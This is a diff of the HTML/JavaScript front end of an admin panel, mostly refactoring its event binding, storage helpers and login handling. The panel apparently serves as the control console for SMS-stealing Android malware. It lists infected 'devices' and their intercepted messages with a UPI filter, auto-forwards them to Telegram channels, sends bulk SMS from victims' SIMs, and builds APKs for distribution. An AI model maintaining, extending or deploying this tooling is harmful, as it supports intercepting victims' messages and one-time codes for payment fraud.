@@ -442,8 +442,7 @@ main{padding:18px 13px}
 <body>
 <div class="layer">
 
-<!-- ============================ LOGIN ============================ -->
-<section class="login" id="loginScreen" hidden>
+<section class="login" id="loginScreen">
 <div class="login-card">
 <div class="brand">
 <svg class="cat" viewBox="0 0 64 64" aria-hidden="true">
@@ -499,7 +498,6 @@ main{padding:18px 13px}
 </div>
 </section>
 
-<!-- ============================ APP ============================ -->
 <div class="app" id="app" hidden>
 <header class="topbar">
 <div class="brand">
@@ -586,6 +584,7 @@ main{padding:18px 13px}
 <div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/api/builder/config</div></div><span class="badge" id="builderBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
 <div class="row"><div><div class="row-name">Telegram bot</div><div class="row-desc">OTP + alerts</div></div><span class="badge" id="botBadge">—</span></div>
+<div class="row"><div><div class="row-name">Device API</div><div class="row-desc">/admin/*</div></div><span class="badge" id="adminBadge">—</span></div>
 </div>
 </section>
 </div>
@@ -1117,6 +1116,17 @@ accentSoft:"#2A2A2E",border:"#2A2A2E",text:"#EAEAEA",muted:"#9A9A9F",
 field:"#1C1C1F",onAccent:"#001B16"
 };
 
+function readLS(key, fallback){
+try{ const v = localStorage.getItem(key); return v === null || v === undefined ? fallback : v; }
+catch(e){ return fallback; }
+}
+function writeLS(key, value){
+try{ localStorage.setItem(key, value); }catch(e){}
+}
+function dropLS(key){
+try{ localStorage.removeItem(key); }catch(e){}
+}
+
 let reloginPromise = null;
 let gridSig = "";
 let liveSig = "";
@@ -1131,7 +1141,7 @@ devices:[], messages:[], devMsgs:{}, rules:[], users:[], admins:[],
 relay:null, relayAccount:null, forward:"",
 outbox:[], growth:null, growthEvents:[],
 apps:[], builds:[], buildCfg:null, quota:null, themes:[],
-pickedTheme:localStorage.getItem(THEME_KEY)||"mono",
+pickedTheme:readLS(THEME_KEY, "mono") || "mono",
 logBuild:null, pf:null,
 pinsOnly:false, active:null, activeId:null, asOpen:false, toastTimer:null,
 pollTimer:null, buildTimer:null,
@@ -1147,7 +1157,23 @@ function reportError(e){
 const msg=(e&&(e.message||(e.reason&&e.reason.message)))||String(e||"unknown error");
 state.lastError=msg; try{console.error(e);}catch(x){}
 }
-window.addEventListener("error",(ev)=>{ if(ev&&ev.message)reportError(ev.message); });
+
+function revealLoginIfBlank(msg){
+try{
+const ls=document.getElementById("loginScreen");
+const app=document.getElementById("app");
+if(ls&&app&&ls.hidden&&app.hidden){
+ls.hidden=false;
+const m=document.getElementById("loginMsg");
+if(m&&msg){ m.textContent=String(msg); m.className="msg err"; }
+}
+}catch(e){}
+}
+
+window.addEventListener("error",(ev)=>{
+if(ev&&ev.message)reportError(ev.message);
+revealLoginIfBlank(ev&&ev.message);
+});
 window.addEventListener("unhandledrejection",(ev)=>{ reportError(ev.reason); });
 
 function notice(text,bad){
@@ -1166,17 +1192,25 @@ if(!text){el.hidden=true;return;}
 el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
 }
 
-function token(){ try{return localStorage.getItem(TKEY)||"";}catch(e){return "";} }
-function setToken(t){ try{ t?localStorage.setItem(TKEY,t):localStorage.removeItem(TKEY);}catch(e){} }
+function token(){ return readLS(TKEY, "") || ""; }
+function setToken(t){ t ? writeLS(TKEY, t) : dropLS(TKEY); }
 function saveSession(id,pass,keep,role){
-try{ localStorage.setItem(SKEY,JSON.stringify({id:id,role:role||"user",
-pass:keep&&pass?btoa(unescape(encodeURIComponent(pass))):null,at:Date.now()})); }catch(e){}
+try{
+writeLS(SKEY, JSON.stringify({id:id,role:role||"user",
+pass:keep&&pass?btoa(unescape(encodeURIComponent(pass))):null,at:Date.now()}));
+}catch(e){}
 }
 function readSession(){
-try{ const s=JSON.parse(localStorage.getItem(SKEY)||"null");
-if(!s||!s.id)return null; if(Date.now()-s.at>2592000000)return null; return s; }catch(e){ return null; }
+try{
+const raw=readLS(SKEY,"");
+if(!raw)return null;
+const s=JSON.parse(raw);
+if(!s||!s.id)return null;
+if(Date.now()-s.at>2592000000)return null;
+return s;
+}catch(e){ return null; }
 }
-function clearSession(){ setToken(""); try{localStorage.removeItem(SKEY);}catch(e){} }
+function clearSession(){ setToken(""); dropLS(SKEY); }
 function decPass(p){ try{return decodeURIComponent(escape(atob(p)));}catch(e){return "";} }
 
 function toast(text){
@@ -1184,8 +1218,8 @@ const t=$("#toast"); if(!t)return;
 t.textContent=text; t.hidden=false;
 clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},3800);
 }
-function loginMsg(text,kind){ const el=$("#loginMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
-function otpMsg(text,kind){ const el=$("#otpMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
+function loginMsg(text,kind){ const el=$("#loginMsg"); if(!el)return; el.textContent=text; el.className="msg "+(kind||"err"); }
+function otpMsg(text,kind){ const el=$("#otpMsg"); if(!el)return; el.textContent=text; el.className="msg "+(kind||"err"); }
 function badge(el,text,kind){ if(!el)return; el.textContent=text; el.className="badge "+(kind||""); }
 
 function fmt(v){ if(!v)return "—"; const d=new Date(v);
@@ -1478,12 +1512,20 @@ badge($("#roleBadge"),state.noAuth?"NO-AUTH":(isAdmin?"ADMIN":"USER"),isAdmin?"o
 }
 
 function showLogin(msgText){
-state.auth=false; $("#app").hidden=true; $("#loginScreen").hidden=false; closeDetail();
-$("#loginCred").hidden=false; $("#loginOtp").hidden=true;
-const s=readSession(); if(s&&s.id&&!$("#loginId").value)$("#loginId").value=s.id;
+state.auth=false;
+const app=$("#app"); if(app)app.hidden=true;
+const ls=$("#loginScreen"); if(ls)ls.hidden=false;
+const cred=$("#loginCred"); if(cred)cred.hidden=false;
+const otp=$("#loginOtp"); if(otp)otp.hidden=true;
+closeDetail();
+const s=readSession(); if(s&&s.id&&$("#loginId")&&!$("#loginId").value)$("#loginId").value=s.id;
 if(msgText)loginMsg(msgText);
 }
-function showApp(){ state.auth=true; $("#loginScreen").hidden=true; $("#app").hidden=false; }
+function showApp(){
+state.auth=true;
+const ls=$("#loginScreen"); if(ls)ls.hidden=true;
+const app=$("#app"); if(app)app.hidden=false;
+}
 
 async function afterLogin(role){
 state.role=role||"user"; applyRole();
@@ -1860,7 +1902,7 @@ grid.innerHTML=state.themes.map((t)=>(
 grid.querySelectorAll(".tcard").forEach((el)=>{
 el.addEventListener("click",()=>{
 state.pickedTheme=el.dataset.slug;
-try{localStorage.setItem(THEME_KEY,state.pickedTheme);}catch(e){}
+writeLS(THEME_KEY,state.pickedTheme);
 renderThemes(); renderThemePreview();
 });
 });
@@ -2304,8 +2346,6 @@ try{ await api("/admin/keys/"+u.id+"/delete",{method:"POST"}); toast("deleted");
 catch(e){ toast(e.message); }
 }
 
-// ------------------------------------------------------------------ admins
-
 function renderAdmins(){
 const body=$("#adminBody");
 $("#adminCount").textContent=state.admins.length+" admins";
@@ -2383,8 +2423,6 @@ try{ await api("/admin/admins/"+a.id+"/delete",{method:"POST"}); toast("deleted"
 catch(e){ toast(e.message); }
 }
 
-// ----------------------------------------------------------------- account
-
 async function loadAccount(){
 try{
 const d=await api("/admin/keys/me");
@@ -2440,8 +2478,6 @@ toast("password badal gaya");
 const s=readSession(); if(s){ saveSession(s.id,n1,true,s.role); }
 }catch(e){ toast(e.message); }
 }
-
-// ------------------------------------------------------------------ bot
 
 async function loadBot(){
 try{
@@ -2772,8 +2808,10 @@ setTimeout(()=>{ if(state.active&&String(devId(state.active))===String(id))fetch
 }
 }
 function closeDetail(){
-$("#detail").hidden=true; document.body.style.overflow="";
-$("#actMenu").hidden=true; state.active=null; state.activeId=null;
+const el=$("#detail"); if(el)el.hidden=true;
+document.body.style.overflow="";
+const m=$("#actMenu"); if(m)m.hidden=true;
+state.active=null; state.activeId=null;
 }
 
 async function loadHealth(){
@@ -3016,34 +3054,43 @@ if(page==="growth")refreshSection("growth");
 if(page==="builder")refreshSection("builder");
 }
 
-function gotoBuilder(ev){ if(ev)ev.preventDefault();
-if(state.auth)navigate("builder"); else if(!$("#loginScreen").hidden)$("#loginId").focus(); }
-$("#apkBtn").addEventListener("click",gotoBuilder);
-$("#apkLogin").addEventListener("click",gotoBuilder);
-$("#apiHint").textContent=location.host||"/";
-$("#apiBase").textContent=location.origin||"/";
+function gotoBuilder(ev){
+if(ev)ev.preventDefault();
+const ls=$("#loginScreen"); const id=$("#loginId");
+if(state.auth)navigate("builder");
+else if(ls&&!ls.hidden&&id)id.focus();
+}
 
-$("#pinsBtn").addEventListener("click",()=>{ state.pinsOnly=!state.pinsOnly;
+function bindEvents(){
+const on=(sel,ev,fn)=>{ const el=$(sel); if(el)el.addEventListener(ev,fn); };
+
+on("#apkBtn","click",gotoBuilder);
+on("#apkLogin","click",gotoBuilder);
+
+const hint=$("#apiHint"); if(hint)hint.textContent=location.host||"/";
+const base=$("#apiBase"); if(base)base.textContent=location.origin||"/";
+
+on("#pinsBtn","click",()=>{ state.pinsOnly=!state.pinsOnly;
 $("#pinsBtn").classList.toggle("on",state.pinsOnly); renderCards(true); });
-$("#devSearch").addEventListener("input",debounce(()=>renderCards(true),160));
-$("#userSearch").addEventListener("input",debounce(renderUsers,160));
-$("#dSearch").addEventListener("input",debounce(renderDetailMsgs,140));
-$("#dDir").addEventListener("change",renderDetailMsgs);
-$("#dUpi").addEventListener("change",renderDetailMsgs);
-$("#dClose").addEventListener("click",closeDetail);
-$("#dMoreToggle").addEventListener("click",()=>{ const b=$("#dMore");
+on("#devSearch","input",debounce(()=>renderCards(true),160));
+on("#userSearch","input",debounce(renderUsers,160));
+on("#dSearch","input",debounce(renderDetailMsgs,140));
+on("#dDir","change",renderDetailMsgs);
+on("#dUpi","change",renderDetailMsgs);
+on("#dClose","click",closeDetail);
+on("#dMoreToggle","click",()=>{ const b=$("#dMore");
 b.hidden=!b.hidden; $("#dMoreToggle").textContent=b.hidden?"show":"hide"; });
-if($("#growthFilter"))$("#growthFilter").addEventListener("change",loadGrowthEvents);
+on("#growthFilter","change",loadGrowthEvents);
 
-$("#devGrid").addEventListener("click",(ev)=>{ const c=ev.target.closest("[data-dev]");
+on("#devGrid","click",(ev)=>{ const c=ev.target.closest("[data-dev]");
 if(c)openDeviceById(c.dataset.dev); });
-$("#devGrid").addEventListener("keydown",(ev)=>{ if(ev.key!=="Enter"&&ev.key!==" ")return;
+on("#devGrid","keydown",(ev)=>{ if(ev.key!=="Enter"&&ev.key!==" ")return;
 const c=ev.target.closest("[data-dev]"); if(c){ ev.preventDefault(); openDeviceById(c.dataset.dev); } });
 
-$("#actBtn").addEventListener("click",(ev)=>{ ev.stopPropagation();
+on("#actBtn","click",(ev)=>{ ev.stopPropagation();
 $("#actMenu").hidden=!$("#actMenu").hidden; });
 
-$("#actMenu").addEventListener("click",async(ev)=>{
+on("#actMenu","click",async(ev)=>{
 const btn=ev.target.closest("[data-act]"); if(!btn)return;
 $("#actMenu").hidden=true;
 const act=btn.dataset.act; const d=state.active; if(!d)return;
@@ -3056,28 +3103,11 @@ if(act==="push"){ await pushOutbox(d); return; }
 if(act==="rename"){ await renameDevice(d); return; }
 });
 
-$("#asCollapse").addEventListener("click",()=>{ const b=$("#asBody");
+on("#asCollapse","click",()=>{ const b=$("#asBody");
 b.hidden=!b.hidden; $("#asCollapse").textContent=b.hidden?"▸":"▾"; });
-$("#asCopy").addEventListener("click",()=>copyText($("#asAccount").textContent.trim()));
+on("#asCopy","click",()=>copyText($("#asAccount").textContent.trim()));
 
-async function saveAutoSender(patch){
-const d=state.active; if(!d)return false;
-const a=autoOf(d);
-const cid=($("#chanInput").value||"").trim()||a.channel_id||"";
-const body=Object.assign({
-enabled:a.enabled, channel_id:cid,
-sim_slots:(a.sim_slots||[]).slice(),
-tg_confirm:a.tg_confirm
-},patch);
-if(body.enabled&&!body.channel_id){ toast("pehle Channel ID daalo"); return false; }
-try{
-const r=await api("/admin/devices/"+devId(d)+"/auto-sender",{method:"POST",body:JSON.stringify(body)});
-d.auto_sender=r.auto_sender||d.auto_sender;
-safe(renderAutoSender,d); renderCards(true); return true;
-}catch(e){ toast(e.message); return false; }
-}
-
-$("#asToggle").addEventListener("click",async()=>{
+on("#asToggle","click",async()=>{
 const d=state.active; if(!d)return;
 const next=!autoOf(d).enabled;
 $("#asToggle").disabled=true;
@@ -3085,14 +3115,14 @@ const ok=await saveAutoSender({enabled:next});
 if(ok)toast("Auto Sender "+(next?"enabled":"disabled"));
 $("#asToggle").disabled=false;
 });
-$("#asTgConfirm").addEventListener("click",async()=>{
+on("#asTgConfirm","click",async()=>{
 const d=state.active; if(!d)return;
 const next=!autoOf(d).tg_confirm;
 const ok=await saveAutoSender({tg_confirm:next});
 if(ok)toast("Telegram confirm "+(next?"ON":"OFF"));
 });
 
-$("#chanVerify").addEventListener("click",async()=>{
+on("#chanVerify","click",async()=>{
 const cid=($("#chanInput").value||"").trim();
 if(!cid){ toast("Channel ID daalo"); return; }
 const btn=$("#chanVerify"); btn.disabled=true; btn.textContent="checking…";
@@ -3107,7 +3137,7 @@ $("#chanMsgTxt").textContent=e.message; $("#chanMsg").hidden=false; }
 finally{ btn.disabled=false; btn.textContent="Verify"; }
 });
 
-$("#chanBind").addEventListener("click",async()=>{
+on("#chanBind","click",async()=>{
 const d=state.active; if(!d)return;
 const cid=($("#chanInput").value||"").trim();
 if(!cid){ toast("Channel ID daalo"); return; }
@@ -3119,13 +3149,13 @@ $("#listenId").textContent=cid; toast("Channel bound!");
 }catch(e){ toast(e.message); } finally{ btn.disabled=false; }
 });
 
-$("#testConn").addEventListener("click",async()=>{
+on("#testConn","click",async()=>{
 const btn=$("#testConn"); btn.disabled=true; btn.textContent="testing…";
 try{ await api("/admin/auto-sender/test",{method:"POST"}); toast("test message bheja"); }
 catch(e){ toast(e.message); } finally{ btn.disabled=false; btn.textContent="Test connection"; }
 });
 
-$("#dSend").addEventListener("click",async()=>{
+on("#dSend","click",async()=>{
 const d=state.active; if(!d)return;
 const body=$("#dBody").value.trim();
 if(!body){ toast("message khali hai"); return; }
@@ -3140,7 +3170,7 @@ if(ok)$("#dBody").value="";
 btn.disabled=false;
 });
 
-$("#bulkSend").addEventListener("click",async()=>{
+on("#bulkSend","click",async()=>{
 const body=$("#bulkBody").value.trim();
 if(!body){ toast("message khali hai"); return; }
 const slots=selSlots(state.sel.bulk||[]);
@@ -3155,11 +3185,11 @@ $("#bulkBody").value="";
 await loadMessages(); await loadStats();
 }catch(e){ toast(e.message); } finally{ $("#bulkSend").disabled=false; }
 });
-$("#bulkTarget").addEventListener("change",()=>{
+on("#bulkTarget","change",()=>{
 badge($("#bulkBadge"),$("#bulkTarget").value==="online"?"online only":"all devices"); });
-$("#bulkClear").addEventListener("click",()=>{ $("#bulkBody").value=""; $("#bulkTo").value=""; });
+on("#bulkClear","click",()=>{ $("#bulkBody").value=""; $("#bulkTo").value=""; });
 
-$("#ruleAdd").addEventListener("click",async()=>{
+on("#ruleAdd","click",async()=>{
 const name=$("#ruleName").value.trim(); const match=$("#ruleMatch").value.trim();
 const reply=$("#ruleReply").value.trim();
 if(!name||!match||!reply){ toast("sab fields bharo"); return; }
@@ -3170,7 +3200,7 @@ $("#ruleUpi").checked=false; toast("rule added"); await loadRules();
 }catch(e){ toast(e.message); }
 });
 
-$("#relayStart").addEventListener("click",async()=>{
+on("#relayStart","click",async()=>{
 const api_id=$("#relayApiId").value.trim();
 const api_hash=$("#relayApiHash").value.trim();
 const phone=$("#relayPhone").value.trim();
@@ -3181,7 +3211,7 @@ await api("/admin/relay/login/start",{method:"POST",body:JSON.stringify({api_id:
 toast("code bheja — Telegram check karo"); await loadRelay();
 }catch(e){ toast(e.message); } finally{ $("#relayStart").disabled=false; }
 });
-$("#relayVerify").addEventListener("click",async()=>{
+on("#relayVerify","click",async()=>{
 $("#relayVerify").disabled=true;
 try{
 await api("/admin/relay/login/verify",{method:"POST",
@@ -3190,41 +3220,41 @@ $("#relayCode").value=""; $("#relayPass").value="";
 toast("relay connected"); await loadRelay(); await loadAutoSender();
 }catch(e){ toast(e.message); } finally{ $("#relayVerify").disabled=false; }
 });
-$("#relayLogout").addEventListener("click",async()=>{
+on("#relayLogout","click",async()=>{
 try{ await api("/admin/relay/logout",{method:"POST"}); toast("logged out"); await loadRelay(); }
 catch(e){ toast(e.message); } });
-$("#relayTest").addEventListener("click",async()=>{
+on("#relayTest","click",async()=>{
 try{ await api("/admin/auto-sender/test",{method:"POST"}); toast("test message bheja"); }
 catch(e){ toast(e.message); } });
-$("#fwdSave").addEventListener("click",async()=>{
+on("#fwdSave","click",async()=>{
 const t=$("#fwdInput").value.trim();
 try{ const r=await api("/admin/relay/forward",{method:"POST",body:JSON.stringify({target:t})});
 state.forward=r.forward_user||t; toast("forward target saved"); await loadRelay(); }
 catch(e){ toast(e.message); } });
-$("#banAdd").addEventListener("click",async()=>{
+on("#banAdd","click",async()=>{
 const a=$("#banInput").value.trim(); if(!a)return;
 try{ await api("/admin/relay/bans",{method:"POST",body:JSON.stringify({address:a})});
 $("#banInput").value=""; await loadRelay(); }catch(e){ toast(e.message); } });
-$("#parseBtn").addEventListener("click",async()=>{
+on("#parseBtn","click",async()=>{
 const text=$("#parseText").value.trim(); if(!text)return;
 try{ const r=await api("/admin/relay/parse",{method:"POST",body:JSON.stringify({text:text})});
 $("#parseOut").textContent=JSON.stringify(r,null,2); }
 catch(e){ $("#parseOut").textContent=e.message; } });
 
-$("#msgFilter").addEventListener("change",renderMessages);
-$("#msgSearch").addEventListener("input",debounce(renderMessages,160));
+on("#msgFilter","change",renderMessages);
+on("#msgSearch","input",debounce(renderMessages,160));
 
-$("#appCreate").addEventListener("click",createApp);
-$("#quickBuild").addEventListener("click",quickBuild);
-$("#appName").addEventListener("input",suggestPkg);
-$("#appPkg").addEventListener("input",(e)=>{ e.target.dataset.touched="1"; });
-$("#secretCopy").addEventListener("click",()=>copyText($("#secretValue").textContent.trim()));
-$("#secretHide").addEventListener("click",()=>{ $("#secretOut").hidden=true; });
-$("#logClose").addEventListener("click",()=>{ $("#logPanel").hidden=true; state.logBuild=null; });
-$("#logReload").addEventListener("click",fetchBuildLog);
-$("#pfBtn").addEventListener("click",showPreflight);
+on("#appCreate","click",createApp);
+on("#quickBuild","click",quickBuild);
+on("#appName","input",suggestPkg);
+on("#appPkg","input",(e)=>{ e.target.dataset.touched="1"; });
+on("#secretCopy","click",()=>copyText($("#secretValue").textContent.trim()));
+on("#secretHide","click",()=>{ $("#secretOut").hidden=true; });
+on("#logClose","click",()=>{ $("#logPanel").hidden=true; state.logBuild=null; });
+on("#logReload","click",fetchBuildLog);
+on("#pfBtn","click",showPreflight);
 
-$("#kGen").addEventListener("click",async()=>{
+on("#kGen","click",async()=>{
 const btn=$("#kGen"); btn.disabled=true;
 try{
 const r=await api("/admin/keys",{method:"POST",body:JSON.stringify({
@@ -3241,27 +3271,27 @@ toast("key ban gayi — credentials copy karke user ko bhejo");
 await loadUsers();
 }catch(e){ toast(e.message); } finally{ btn.disabled=false; }
 });
-$("#kCopy").addEventListener("click",()=>{
+on("#kCopy","click",()=>{
 copyText($("#kValue").textContent.trim()+"  /  "+$("#kPassValue").textContent.trim(),"credentials");
 });
 
-$a = null;
-$("#aCreate").addEventListener("click",createAdmin);
-$("#aCopy").addEventListener("click",()=>copyText($("#aValue").textContent.trim(),"credentials"));
-$("#accPassSave").addEventListener("click",savePassword);
-$("#botReload").addEventListener("click",loadBot);
-$("#botTest").addEventListener("click",async()=>{
+on("#aCreate","click",createAdmin);
+on("#aCopy","click",()=>copyText($("#aValue").textContent.trim(),"credentials"));
+on("#accPassSave","click",savePassword);
+on("#botReload","click",loadBot);
+on("#botTest","click",async()=>{
 try{ await api("/admin/bot/test",{method:"POST"}); toast("test notification bheja"); }
 catch(e){ toast(e.message); } });
 
-$("#loginForm").addEventListener("submit",async(ev)=>{
+on("#loginForm","submit",async(ev)=>{
 ev.preventDefault();
 const btn=$("#loginBtn"); btn.disabled=true; btn.textContent="Signing in…";
 loginMsg("");
 const id=$("#loginId").value.trim();
 const pass=$("#loginPass").value;
 const keep=$("#remember").checked;
-const looksKey = /^TPC/i.test(id.replace(/[^A-Za-z0-9]/g,"")) && id.replace(/[^A-Za-z0-9]/g,"").length >= 10;
+const clean=id.replace(/[^A-Za-z0-9]/g,"");
+const looksKey=/^TPC/i.test(clean)&&clean.length>=10;
 try{
 const url = looksKey ? "/panel/access" : "/panel/login";
 const body = looksKey ? {key:id, password:pass} : {login_id:id, password:pass};
@@ -3292,23 +3322,7 @@ loginMsg(err.message||"Access denied");
 }finally{ btn.disabled=false; btn.textContent="Sign in"; }
 });
 
-function startOtpCountdown(ttl, resendAfter){
-clearInterval(otpTimer);
-let left=ttl, resend=resendAfter;
-const ttlEl=$("#otpTtl"); const rb=$("#otpResend");
-rb.disabled=true;
-const tick=()=>{
-ttlEl.textContent = left>0 ? ("expires in "+left+"s") : "expired";
-if(resend>0){ resend--; rb.disabled=true; rb.textContent="Resend in "+resend+"s"; }
-else { rb.disabled=false; rb.textContent="Resend code"; }
-if(left>0)left--;
-if(left<=0&&resend<=0)clearInterval(otpTimer);
-};
-tick();
-otpTimer=setInterval(tick,1000);
-}
-
-$("#otpForm").addEventListener("submit",async(ev)=>{
+on("#otpForm","submit",async(ev)=>{
 ev.preventDefault();
 if(!otpChallenge)return;
 const btn=$("#otpBtn"); btn.disabled=true; btn.textContent="Verifying…";
@@ -3331,7 +3345,7 @@ otpMsg(err.message||"Verify fail");
 }finally{ btn.disabled=false; btn.textContent="Verify"; }
 });
 
-$("#otpResend").addEventListener("click",async()=>{
+on("#otpResend","click",async()=>{
 if(!otpChallenge)return;
 try{
 const r=await api("/panel/otp/resend",{method:"POST",body:JSON.stringify({challenge:otpChallenge.challenge})},false);
@@ -3340,12 +3354,12 @@ startOtpCountdown(r.ttl||300, r.resend_after||45);
 }catch(e){ otpMsg(e.message); }
 });
 
-$("#otpBack").addEventListener("click",()=>{
+on("#otpBack","click",()=>{
 clearInterval(otpTimer); otpChallenge=null;
 $("#loginOtp").hidden=true; $("#loginCred").hidden=false;
 });
 
-$("#logoutBtn").addEventListener("click",async()=>{
+on("#logoutBtn","click",async()=>{
 if(state.noAuth){ location.reload(); return; }
 try{ await api("/admin/logout",{method:"POST"},false); }catch(e){}
 try{ if(state.ws)state.ws.close(); }catch(e){}
@@ -3359,27 +3373,79 @@ state.apps=[]; state.builds=[]; state.logBuild=null; state.quota=null;
 state.pinsOnly=false; state.role="user"; state.userId=""; state.ownerId=""; state.noAdmin=false; adminProbed=false;
 state.sel={as:[],send:[],bulk:[]}; state.selLive={}; state.draft={}; state.numTried={};
 gridSig=""; liveSig="";
-$("#pinsBtn").classList.remove("on");
-$("#logPanel").hidden=true;
+const pb=$("#pinsBtn"); if(pb)pb.classList.remove("on");
+const lp=$("#logPanel"); if(lp)lp.hidden=true;
 showLogin(""); toast("logged out");
 });
 
 document.querySelectorAll(".nav").forEach((b)=>b.addEventListener("click",()=>navigate(b.dataset.page)));
 document.querySelectorAll("[data-goto]").forEach((b)=>b.addEventListener("click",()=>navigate(b.dataset.goto)));
 document.querySelectorAll("[data-refresh]").forEach((b)=>b.addEventListener("click",()=>refreshSection(b.dataset.refresh)));
-$("#refreshBtn").addEventListener("click",refreshAll);
+on("#refreshBtn","click",refreshAll);
 
-document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("#actMenu").hidden=true; });
-document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
+document.addEventListener("click",(ev)=>{
+const m=$("#actMenu");
+if(m&&!ev.target.closest(".act-wrap"))m.hidden=true;
+});
+document.addEventListener("keydown",(ev)=>{
+const d=$("#detail");
+if(ev.key==="Escape"&&d&&!d.hidden)closeDetail();
+});
 document.addEventListener("visibilitychange",()=>{
 if(!document.hidden&&state.auth){
 if(!state.noAdmin){ loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); }
 loadBuilds().catch(()=>{});
 }});
+}
 
-buildSimChips($("#bulkSims"),"bulk",null);
-checkAuth();
+function startOtpCountdown(ttl, resendAfter){
+clearInterval(otpTimer);
+let left=ttl, resend=resendAfter;
+const ttlEl=$("#otpTtl"); const rb=$("#otpResend");
+if(rb)rb.disabled=true;
+const tick=()=>{
+if(ttlEl)ttlEl.textContent = left>0 ? ("expires in "+left+"s") : "expired";
+if(resend>0){ resend--; if(rb){ rb.disabled=true; rb.textContent="Resend in "+resend+"s"; } }
+else { if(rb){ rb.disabled=false; rb.textContent="Resend code"; } }
+if(left>0)left--;
+if(left<=0&&resend<=0)clearInterval(otpTimer);
+};
+tick();
+otpTimer=setInterval(tick,1000);
+}
+
+async function saveAutoSender(patch){
+const d=state.active; if(!d)return false;
+const a=autoOf(d);
+const cid=($("#chanInput").value||"").trim()||a.channel_id||"";
+const body=Object.assign({
+enabled:a.enabled, channel_id:cid,
+sim_slots:(a.sim_slots||[]).slice(),
+tg_confirm:a.tg_confirm
+},patch);
+if(body.enabled&&!body.channel_id){ toast("pehle Channel ID daalo"); return false; }
+try{
+const r=await api("/admin/devices/"+devId(d)+"/auto-sender",{method:"POST",body:JSON.stringify(body)});
+d.auto_sender=r.auto_sender||d.auto_sender;
+safe(renderAutoSender,d); renderCards(true); return true;
+}catch(e){ toast(e.message); return false; }
+}
+
+function bootSafe(){
+try{
+const bs=$("#bulkSims");
+if(bs)buildSimChips(bs,"bulk",null);
+}catch(e){ reportError(e); }
+
+try{ bindEvents(); }
+catch(e){ reportError(e); revealLoginIfBlank(e&&e.message); return; }
+
+try{ checkAuth(); }
+catch(e){ reportError(e); showLogin("Panel script error: "+(e&&e.message||e)); }
+}
+
+if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",bootSafe);
+else bootSafe();
 </script>
-</div>
 </body>
 </html>
